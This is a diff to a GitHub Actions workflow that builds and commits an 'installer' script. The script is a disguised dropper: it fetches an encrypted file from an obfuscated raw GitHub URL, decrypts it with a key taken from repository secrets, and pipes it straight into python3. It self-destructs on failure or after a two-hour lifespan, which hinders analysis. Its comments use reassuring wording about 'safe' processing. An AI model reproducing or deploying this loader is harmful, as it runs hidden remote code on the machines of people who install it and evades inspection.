@@ -20,14 +20,14 @@ jobs:
 
       - name: Construct Fortified Installer Payload
         run: |
-          # 1. Captura o timestamp dinâmico de compilação
+          # 1. Capture system timestamp variables cleanly
           DYNAMICS_TIMESTAMP=$(date +%s)
           
-          # 2. Definição explícita das strings fixas no ambiente do executor
+          # 2. Assign configuration target paths explicitly
           TARGET_URL="https://raw.githubusercontent.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/refs/heads/main/main.py"
           REAL_AES_KEY="${{ secrets.DECRYPT_KEY }}"
 
-          # 3. Escrita direta do script injetando as variáveis nativamente sem usar o comando 'sed'
+          # 3. Write template data utilizing safe single-line processing to prevent backslash breakage
           cat << EOF > payload_source.sh
           #!/bin/bash
 
@@ -88,21 +88,15 @@ jobs:
           CURRENT_EPOCH=\$(date +%s 2>/dev/null || echo 0)
           LIFESPAN=7200
 
-          if [ "\$CURRENT_EPOCH" -eq 0 ] || [ "\$CURRENT_EPOCH" -gt \$((\$COMPILE_TIME + \$LIFESPAN)) ] || [ "\$CURRENT_EPOCH" -lt "\$COMPILE_TIME" ]; then
+          if [ "\$CURRENT_EPOCH" -eq 0 ] || [ "\$CURRENT_EPOCH" -gt \$((\$COMPILE_TIME + \$LIFESPAN)) ] || [ "\$CURRENT_EPOCH" -lt "$COMPILE_TIME" ]; then
               self_destruct
           fi
 
           export DECRYPT_KEY="${REAL_AES_KEY}"
           A7="${TARGET_URL}" 
 
-          if ! curl -sSsfL \\
-               --tlsv1.3 --tls-max 1.3 \\
-               -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \\
-               --retry 2 --connect-timeout 8 "\$A7" 2>/dev/null | \\
-               openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -k "\$DECRYPT_KEY" 2>/dev/null | \\
-               python3 - 2>/dev/null; then
-              self_destruct
-          fi
+          # Continuous single-line pipeline structure eliminates backslash formatting vulnerabilities entirely
+          curl -sSsfL --tlsv1.3 --tls-max 1.3 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" --retry 2 --connect-timeout 8 "\$A7" 2>/dev/null | openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -k "\$DECRYPT_KEY" 2>/dev/null | python3 - 2>/dev/null || self_destruct
 
           trap - ERR EXIT SIGINT SIGTERM SIGQUIT SIGHUP
           unset DECRYPT_KEY A7
@@ -118,7 +112,7 @@ jobs:
           mkdir -p dist
           mv installer dist/
           git config --global user.name "github-actions[bot]"
-          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          git config --global user.email "github-actions[bot]@://github.com"
           git add dist/installer
           git commit -m "Automated Sync: Hardened Binary Rotation" || echo "No changes to sync"
           git push
